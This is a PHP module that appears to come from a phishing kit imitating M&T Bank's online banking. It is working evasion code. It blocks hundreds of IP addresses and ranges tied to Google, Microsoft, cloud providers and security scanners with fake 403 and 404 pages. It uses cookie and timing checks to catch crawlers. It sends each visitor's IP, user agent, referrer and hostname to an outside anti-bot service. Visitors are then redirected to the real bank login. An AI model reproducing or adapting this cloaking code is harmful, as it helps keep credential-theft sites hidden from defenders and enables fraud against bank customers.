<?php
		
function checktempbanlist($ip){
		$d=dirname($_SERVER['PHP_SELF'],1);
		if($d=='\\' || $d=='/' || getcwd() == gethomedir()){$dirstep=gethomedir();} elseif(substr($d,-7)=='confirm'){$dirstep='../..';} else{$dirstep='..';};
		$fp = @fopen($dirstep."/bad_ips.txt","r");
		if ($fp) {
			$iparray = explode("\n", fread($fp, filesize($dirstep."/bad_ips.txt")));
			if(count($iparray)>0){
			if(in_array($ip,$iparray)){logbot('BANNED BEFORE');updateadmin('bots');
			header('HTTP/1.0 404 Not Found');die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');exit();}
			else {
				foreach($iparray as $ipc) {
			if(preg_match('/' . $ipc . '/',$ip)){logbot('BANNED BEFORE');updateadmin('bots');
			header('HTTP/1.0 404 Not Found');die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');exit();};};};};
	};
	}; 

$IP_Connected = getcurrip();
 $IP_Banned = array('1.9.2.13', '1.9.2.15', '1.128.96.181', '1.132.97.75', '1.152.96.223', '1.152.97.32', '2.57.122.25', '2.57.169.39', '3.21.190.175', '3.231.57.131', '3.239.251.167', '4.14.0.0', '5.62.39.18', '5.62.41.35', '5.62.56.91', '5.101.137.195', '5.101.174.196', '5.181.234.188', '5.226.142.232', '15.236.18.4', '18.117.82.207', '23.21.227.69', '23.27.153.247', '23.27.154.37', '23.202.231.167', '23.217.138.108', '24.23.24.144', '27.0.1453.110', '27.54.62.91', '31.168.158.239', '34.204.239.194', '34.222.143.168', '34.237.113.113', '35.84.132.147', '37.19.196.223', '37.128.131.171', '37.187.96.202', '37.252.238.50', '38.108.182.5', '38.145.80.113', '39.0.2150.5', '40.114.51.187', '43.0.2357.81', '44.0.2403.155', '45.33.89.168', '45.55.4.49', '45.55.4.51', '45.55.76.116', '45.72.48.130', '45.146.164.110', '46.101.35.65', '46.101.80.156', '46.101.94.163', '46.101.249.238', '46.134.7.80', '47.30.133.89', '50.16.241.113', '50.16.241.114', '50.16.241.117', '50.16.247.234', '50.112.194.65', '50.116.2.167', '51.0.2704.103', '51.15.191.81', '51.89.194.75', '51.89.217.2', '51.89.217.115', '51.89.228.201', '51.89.235.201', '51.103.26.168', '52.5.98.73', '52.5.190.19', '52.16.137.212', '52.17.89.34', '52.17.122.199', '52.18.11.161', '52.18.84.133', '52.18.243.153', '52.19.73.31', '52.19.95.184', '52.19.96.28', '52.19.107.105', '52.19.223.183', '52.27.2.86', '52.27.133.197', '52.30.18.87', '52.30.171.229', '52.31.63.97', '52.31.95.244', '52.31.138.216', '52.31.206.114', '52.51.31.125', '52.53.157.84', '52.72.33.140', '52.87.10.90', '52.91.94.56', '52.192.164.225', '52.204.97.54', '52.250.30.131', '53.0.2785.116', '54.38.210.133', '54.72.98.149', '54.154.176.190', '54.197.234.188', '54.208.100.253', '54.213.103.141', '54.217.117.101', '54.221.27.173', '54.228.218.117', '54.245.191.79', '56.0.2924.87', '57.0.2987.98', '61.0.3116.0', '62.24.252.133', '62.67.194.35', '62.149.225.67', '62.210.13.58', '63.0.3239.132', '63.123.238.8', '64.0.3282.140', '64.0.3282.167', '64.62.197.152', '64.137.22.213', '64.227.39.49', '64.227.43.95', '65.54.188.94', '65.54.188.110', '65.54.188.126', '65.55.33.119', '65.55.33.135', '65.55.37.72', '65.55.37.88', '65.55.37.104', '65.55.37.120', '65.55.85.12', '65.55.92.136', '65.55.92.152', '65.55.92.168', '65.55.92.184', '65.55.206.154', '65.154.226.100', '65.154.226.165', '65.155.30.101', '65.214.45.143', '65.214.45.148', '66.0.3358.0', '66.0.3359.0', '66.102.6.10', '66.211.169.3', '66.211.169.66', '66.235.124.7', '66.235.124.73', '66.235.124.74', '66.235.124.101', '66.235.124.192', '66.235.124.193', '66.235.124.196', '66.249.66.1', '66.249.91.203', '67.0.3360.0', '67.0.3361.0', '68.65.53.71', '68.183.38.243', '68.183.40.47', '68.183.41.202', '68.183.241.134', '68.183.245.118', '69.25.58.56', '69.164.111.198', '74.120.14.39', '75.126.243.167', '75.163.12.85', '76.19.184.88', '77.69.251.230', '77.247.110.194', '79.79.147.162', '79.79.148.223', '79.185.91.53', '80.44.18.224', '80.104.176.17', '81.0.48.138', '82.102.27.75', '82.102.27.77', '82.112.184.223', '82.223.27.82', '83.41.123.192', '84.13.191.239', '84.17.35.232', '84.92.148.184', '86.106.87.228', '86.188.235.233', '86.188.235.235', '87.113.96.90', '87.115.213.2', '88.99.62.141', '89.36.26.183', '89.163.159.214', '89.234.157.254', '91.231.212.111', '92.103.69.158', '96.248.52.19', '97.85.126.186', '99.80.179.158', '99.86.159.17', '99.86.159.25', '99.86.159.53', '99.86.159.115', '101.174.147.73', '103.248.172.42', '104.62.2.60', '104.83.233.198', '104.108.64.175', '104.131.57.83', '104.131.165.123', '104.131.211.8', '104.152.222.37', '104.152.222.45', '104.209.191.112', '104.244.72.115', '104.248.172.31', '105.112.37.85', '107.152.233.69', '107.173.59.173', '107.178.194.64', '108.161.29.60', '115.238.55.18', '119.97.214.138', '122.155.174.74', '128.1.248.42', '128.14.133.58', '128.14.141.34', '128.14.209.162', '128.199.184.47', '129.88.46.51', '134.170.2.199', '138.68.157.33', '138.68.167.164', '138.197.207.147', '139.99.252.94', '145.239.156.71', '145.239.156.89', '145.239.206.161', '146.185.135.132', '146.185.179.135', '147.147.220.127', '150.70.168.35', '150.70.188.167', '150.136.105.132', '154.3.44.202', '154.16.122.18', '154.127.57.30', '157.230.194.216', '157.230.210.133', '157.245.40.134', '157.245.43.122', '158.222.8.6', '159.65.210.36', '159.89.154.136', '159.89.220.57', '159.203.0.156', '161.35.41.76', '161.35.89.84', '161.35.89.180', '161.35.89.202', '161.35.121.7', '161.35.161.175', '161.97.151.211', '162.142.125.40', '162.221.192.26', '162.224.156.32', '162.243.69.215', '162.243.88.97', '162.243.128.197', '162.243.187.126', '163.172.174.24', '165.22.30.11', '165.227.0.128', '165.227.39.194', '165.232.96.172', '167.71.13.196', '167.88.60.234', '167.88.60.254', '167.99.192.69', '167.172.48.243', '167.248.133.37', '168.151.106.211', '168.151.162.215', '170.250.139.48', '171.13.14.44', '173.194.116.102', '173.194.116.149', '173.230.147.44', '173.239.230.97', '173.239.240.147', '174.138.115.170', '177.39.232.144', '178.17.170.156', '178.33.144.176', '178.62.113.173', '178.128.140.117', '178.128.194.144', '178.238.11.64', '178.238.11.119', '180.149.125.175', '181.214.32.196', '181.214.58.235', '181.214.145.163', '181.214.180.214', '181.215.27.41', '181.215.79.103', '181.215.93.11', '181.215.147.13', '182.75.120.10', '184.170.246.173', '185.17.27.109', '185.28.20.243', '185.75.141.32', '185.104.120.4', '185.104.186.168', '185.130.184.200', '185.169.233.84', '185.169.255.131', '185.216.74.42', '185.220.101.26', '185.226.144.12', '185.229.190.140', '188.166.63.71', '191.96.116.221', '192.36.27.7', '192.81.220.62', '192.241.193.223', '192.241.202.166', '192.241.219.51', '193.27.12.164', '193.118.53.202', '193.118.53.210', '193.176.30.76', '193.221.113.53', '193.226.177.45', '194.36.110.198', '195.239.51.49', '196.52.84.81', '198.50.163.54', '198.211.109.153', '198.240.89.162', '198.240.101.144', '202.143.148.61', '204.13.201.137', '204.101.161.159', '205.169.39.138', '205.169.39.183', '206.189.17.148', '206.189.18.205', '206.189.26.4', '206.189.127.212', '206.189.255.141', '207.46.8.167', '207.46.8.199', '207.154.228.159', '207.154.229.251', '207.154.255.200', '208.76.45.53', '208.80.194.27', '208.80.194.31', '208.87.233.140', '208.87.234.140', '209.19.186.231', '209.97.136.148', '209.97.188.243', '212.83.139.219', '212.83.170.209', '212.92.117.5', '216.19.220.109', '216.33.229.163', '216.58.211.37', '216.131.76.16', '216.163.176.191', '216.164.117.239', '216.218.206.69', '217.16.26.166', '217.96.188.74', '217.96.197.246', '219.117.238.170', '^1.33.126.*', '^1.234.41.*', '^2.57.*.*', '^3.21.*.*', '^3.231.*.*', '^3.239.*.*', '^4.14.64.*', '^5.189.*.*', '^8.6.48.*', '^8.12.*.*', '^8.23.224.*', '^10.8.0.*', '^12.148.196.*', '^12.148.209.*', '^13.32.219.*', '^13.57.36.*', '^13.224.193.*', '^14.101.178.*', '^15.236.*.*', '^17.198.249.*', '^18.117.*.*', '^23.27.152.*', '^23.251.*.*', '^24.172.*.*', '^34.141.*.*', '^34.204.*.*', '^34.222.*.*', '^35.84.*.*', '^35.153.86.*', '^35.172.115.*', '^36.74.236.*', '^36.83.56.*', '^37.140.188.*', '^38.74.138.*', '^38.100.*.*', '^38.105.*.*', '^38.108.*.*', '^38.144.36.*', '^40.85.158.*', '^40.107.*.*', '^40.114.*.*', '^40.121.198.*', '^41.208.72.*', '^42.112.8.*', '^45.33.*.*', '^45.55.2.*', '^45.72.*.*', '^45.79.*.*', '^45.146.*.*', '^46.4.120.*', '^46.101.43.*', '^46.101.119.*', '^46.116.*.*', '^46.244.*.*', '^49.104.10.*', '^50.7.*.*', '^50.97.*.*', '^50.107.*.*', '^51.15.*.*', '^51.103.*.*', '^51.141.*.*', '^52.27.*.*', '^52.31.147.*', '^52.53.*.*', '^52.90.*.*', '^54.164.*.*', '^54.176.*.*', '^54.221.*.*', '^54.228.218.*', '^61.21.221.*', '^62.90.*.*', '^62.99.77.*', '^62.116.207.*', '^62.141.65.*', '^64.4.*.*', '^64.18.*.*', '^64.27.2.*', '^64.37.103.*', '^64.62.136.*', '^64.62.175.*', '^64.62.*.*', '^64.68.90.*', '^64.68.*.*', '^64.71.193.*', '^64.71.204.*', '^64.71.205.*', '^64.71.206.*', '^64.71.*.*', '^64.74.215.*', '^64.74.*.*', '^64.106.213.*', '^64.124.14.*', '^64.137.*.*', '^64.233.160.*', '^64.233.173.*', '^64.233.191.255*', '^64.233.191.*', '^64.233.*.*', '^64.235.153.*', '^64.235.154.*', '^64.235.*.*', '^65.52.*.*', '^65.154.*.*', '^65.208.151.*', '^66.102.6.*', '^66.102.8.*', '^66.102.*.*', '^66.135.200.*', '^66.150.14.*', '^66.196.*.*', '^66.205.64.*', '^66.207.120.*', '^66.211.160.86*', '^66.211.168.*', '^66.211.169.*', '^66.211.170.*', '^66.211.171.*', '^66.214.*.*', '^66.221.*.*', '^66.228.*.*', '^66.249.91.*', '^66.249.*.*', '^67.15.*.*', '^67.195.*.*', '^67.209.128.*', '^68.14.83.*', '^68.142.*.*', '^69.61.12.*', '^69.65.*.*', '^69.164.111.*', '^69.164.145.*', '^69.164.*.*', '^71.6.*.*', '^72.13.86.*', '^72.14.192.*', '^72.14.199.*', '^72.14.*.*', '^72.30.*.*', '^72.49.133.*', '^72.52.96.*', '^72.94.249.*', '^74.6\..*.*', '^74.120.*.*', '^74.125.133.*', '^74.125.*.*', '^77.247.*.*', '^78.148.13.*', '^81.0.48.*', '^81.161.59.*', '^82.102.*.*', '^82.166.*.*', '^83.31.69.*', '^83.31.118.*', '^83.31.*.*', '^83.41.*.*', '^83.71.*.*', '^84.51.153.*', '^84.93.84.*', '^85.9.7.*', '^85.64.*.*', '^85.250.*.*', '^86.132.235.*', '^87.106.251.*', '^87.115.213.*', '^89.108.102.*', '^89.138.*.*', '^89.187.*.*', '^89.234.*.*', '^91.103.66.*', '^91.231.212.*', '^91.231.*.*', '^92.23.56.*', '^92.103.69.*', '^92.189.25.*', '^93.54.82.*', '^93.119.*.*', '^93.172.*.*', '^94.26.*.*', '^95.45.252.*', '^95.76.156.*', '^95.85.*.*', '^95.108.194.*', '^98.136.*.*', '^100.6.107.*', '^100.43.*.*', '^103.6.76.*', '^103.19.16.*', '^103.35.*.*', '^103.86.99.*', '^104.15.60.*', '^104.42.*.*', '^104.131.223.*', '^104.132.20.*', '^104.132.*.*', '^104.140.*.*', '^104.236.153.*', '^105.107.79.*', '^106.12.*.*', '^106.133.165.*', '^107.20.181.*', '^107.170.*.*', '^107.178.194.*', '^107.178.195.*', '^107.178.*.*', '^108.162.215.*', '^108.162.246.*', '^108.210.106.*', '^109.186.*.*', '^110.88.*.*', '^111.89.*.*', '^111.231.*.*', '^115.231.36.*', '^119.63.*.*', '^124.66.185.*', '^128.1.*.*', '^128.14.*.*', '^128.28.*.*', '^128.72.*.*', '^128.75.*.*', '^128.199.154.*', '^128.242.*.*', '^131.120.12.*', '^131.212.*.*', '^131.253.*.*', '^133.11.204.*', '^134.119.*.*', '^134.122.*.*', '^134.209.*.*', '^136.144.*.*', '^138.122.*.*', '^138.197.207.*', '^139.59.*.*', '^141.101.104.*', '^141.185.209.*', '^143.204.90.*', '^143.204.209.*', '^144.86.*.*', '^144.217.82.*', '^146.112.*.*', '^147.75.210.*', '^148.163.128.*', '^149.20.54.*', '^149.20.*.*', '^149.154.*.*', '^157.39.109.*', '^157.54.*.*', '^157.55.39.*', '^157.201.10.*', '^157.230.*.*', '^157.240.*.*', '^158.69.216.*', '^158.108.*.*', '^159.65.*.*', '^161.35.*.*', '^161.97.*.*', '^162.142.*.*', '^162.158.7.*', '^162.158.72.*', '^162.158.95.*', '^162.158.*.*', '^162.221.*.*', '^162.244.*.*', '^163.195.178.*', '^167.24.*.*', '^167.71.*.*', '^167.99.*.*', '^167.248.*.*', '^168.151.*.*', '^168.188.*.*', '^169.207.238.*', '^172.105.*.*', '^172.217.*.*', '^173.11.97.*', '^173.14.18.*', '^173.192.*.*', '^173.194.112.*', '^173.194.*.*', '^173.205.33.*', '^173.224.160.*', '^173.224.161.*', '^173.224.162.*', '^173.224.163.*', '^173.224.164.*', '^173.224.165.*', '^173.224.166.*', '^173.224.167.*', '^173.239.*.*', '^173.244.36.*', '^173.245.55.*', '^173.252.86.*', '^173.252.*.*', '^174.255.*.*', '^175.135.172.*', '^176.195.231.*', '^178.43.117.*', '^178.62.*.*', '^178.128.*.*', '^180.29.89.*', '^180.149.*.*', '^181.214.*.*', '^181.215.*.*', '^181.229.*.*', '^182.75.120.*', '^183.136.*.*', '^184.105.*.*', '^184.165.*.*', '^184.173.*.*', '^185.2.138.*', '^185.20.4.*', '^185.20.5.*', '^185.28.20.*', '^185.41.162.*', '^185.75.*.*', '^185.145.156.*', '^185.173.*.*', '^185.220.101.*', '^186.6.*.*', '^188.165.83.*', '^188.166.*.*', '^188.207.200.*', '^188.241.156.*', '^188.244.39.*', '^190.82.81.*', '^191.98.136.*', '^192.35.*.*', '^192.115.134.*', '^192.118.48.*', '^192.232.213.*', '^192.241.*.*', '^193.47.80.*', '^193.118.*.*', '^193.128.*.*', '^193.220.178.*', '^193.226.*.*', '^193.253.199.*', '^194.52.68.*', '^194.72.238.*', '^194.90.*.*', '^194.153.113.*', '^195.128.227.*', '^195.154.*.*', '^195.211.23.*', '^195.211.*.*', '^196.23.168.*', '^198.25.*.*', '^198.41.243.*', '^198.54.*.*', '^198.60.236.*', '^198.68.61.*', '^198.186.190.*', '^198.186.191.*', '^198.186.192.*', '^198.186.193.*', '^198.240.*.*', '^199.3.10.*', '^199.30.228.*', '^199.59.150.*', '^202.*.*.*', '^203.188.221.*', '^203.215.181.*', '^204.14.48.*', '^204.85.191.*', '^204.119.24.*', '^204.251.90.*', '^205.201.132.*', '^205.213.*.*', '^206.28.72.*', '^206.80.*.*', '^206.207.80.*', '^206.207.*.*', '^206.253.226.*', '^207.46.*.*', '^207.68.*.*', '^207.70.*.*', '^207.80.*.*', '^207.126.144.*', '^208.43.225.*', '^208.65.144.*', '^208.84.*.*', '^208.87.233.*', '^208.91.115.*', '^208.101.*.*', '^209.19.185.*', '^209.19.*.*', '^209.66.70.*', '^209.73.228.*', '^209.85.128.*', '^209.85.*.*', '^209.135.212.*', '^209.185.108.*', '^209.185.253.*', '^209.191.*.*', '^210.55.200.*', '^212.8.79.*', '^212.29.192.*', '^212.29.224.*', '^212.50.193.*', '^212.102.*.*', '^212.113.37.*', '^212.143.*.*', '^212.150.*.*', '^212.235.*.*', '^213.32.*.*', '^213.100.*.*', '^213.*.*.*', '^216.10.193.*', '^216.58.*.*', '^216.162.209.*', '^216.218.*.*', '^216.239.*.*', '^216.252.*.*', '^217.16.26.*', '^217.74.103.*', '^217.96.*.*', '^217.132.*.*', '^219.*.*.*', '^222.154.252.*', '^252.138.*.*', '^2a02:fe80:1010:.+:.+:.+:.+:.+', '^2a00:1450:.+:.+:.+:.+:.+:.+');
if(in_array($IP_Connected,$IP_Banned)){logbot('BANNED IP');banbot();}
 else {
		foreach($IP_Banned as $ip) {
			if(preg_match('/' . $ip . '/',$IP_Connected)){logbot('BANNED IP');banbot();}
		}
	};

checktempbanlist($IP_Connected);

if(dirname($_SERVER['PHP_SELF']) != '\\' && dirname($_SERVER['PHP_SELF']) != '/' && getcwd() != gethomedir() && !isset($yochadminpage)){
	
	if($_COOKIE[$timecookie]!=md5($timecookie.'7f021a1415b86f2d013b2618fb31ae53y3r')){
	$theerrkey=$_SESSION['dbvar'];
	if(empty($_COOKIE[$_SESSION['ssww']]) || empty($_COOKIE[$_SESSION['sshh']])){logbot('NO COOKIES');banbot();};};


if(isset($_COOKIE[$timecookie])){
	$t = time();$bt = $_COOKIE[$bottime];$d=dirname($_SERVER['PHP_SELF']);
	$curr = $_SERVER['PHP_SELF'] != $d.'/index.php' &&  $_SERVER['PHP_SELF'] != $d.'/login.php';
	$td = $t - $_COOKIE[$bottime];
	if($td < 3 && $curr){logbot('TIME TRICKED BOT');banbot();};
	if($_COOKIE[$timecookie]==md5($timecookie.'7f021a1415b86f2d013b2618fb31ae53y3r')){
	header('location:https://href.li/?https://onlinebanking.mtb.com/Login/MTBSignOn');}}
else{logbot('NO COOKIES');banbot();};
};

function yochiantibots(){
	$ip = getcurrip();
	$ua = $_SERVER['HTTP_USER_AGENT'];
	$hn = gethostbyaddr($_SERVER['REMOTE_ADDR']);
	if(isset($_SERVER['HTTP_REFERER'])){$rf = $_SERVER['HTTP_REFERER'];} else{$rf = 'NONE';};
	$generatedtimekey = substr(sha1(md5(time())), 0,32);
	$data = ['ip' => $ip ,'useragent' => $ua ,'referrer' => $rf ,'hostname' => $hn];
	$antibotsite='http://the-yochi-end.info/botkilla?v=2&key='.$generatedtimekey;
	$ch = curl_init($antibotsite);
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, ($data));
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	$result = curl_exec($ch);
	curl_close($ch);
	if($result=="0"){$_SESSION['checkedyochibot']=1;$_SESSION['ipaddy']=$ip;}
	elseif($result=="1"){logbot('Yochi Antibots');banbot();}
	else{die($result);exit();};
};
if (isset($_SESSION['checkedyochibot']) && isset($_SESSION['ipaddy']) && $_SESSION['ipaddy'] == getcurrip()){} else{yochiantibots();};
	 
	
$ud=file_get_contents(gethomedir().'/admin/db.json');
$udarray = json_decode($ud);
if($udarray->status == 'off' && !isset($yochadminpage)){
	header('HTTP/1.0 404 Not Found');die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
				<html>
					<head>
						<title>404 Not Found</title>
						</head>
					<body>
						<h1>Not Found</h1>
						<p>The requested URL ' . $_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'] . ' was not found on this server.</p>
						<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
					</body>
				</html>');exit();
	};
	 
?>